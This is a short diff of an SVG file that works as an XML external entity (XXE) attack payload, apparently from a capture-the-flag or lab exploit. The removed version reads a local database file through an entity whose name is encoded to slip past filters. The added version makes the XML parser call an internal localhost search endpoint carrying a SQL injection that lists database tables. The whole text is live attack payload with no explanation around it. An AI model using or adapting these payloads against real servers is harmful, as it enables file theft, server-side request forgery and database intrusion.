@@ -1,7 +1,6 @@
-<?xml version="1.0"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "f&#105;le:///app/history.db">
+<!ENTITY % xxe SYSTEM "http://localhost:8001/search?q=' UNION SELECT name, sql FROM sqlite_master WHERE type='table' AND name NOT LIKE 'history' -- ">
+%xxe;
 ]>
-<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
-  <text x="10" y="20" font-size="12">&xxe;</text>
-</svg>
+<svg xmlns="http://www.w3.org/2000/svg"/>
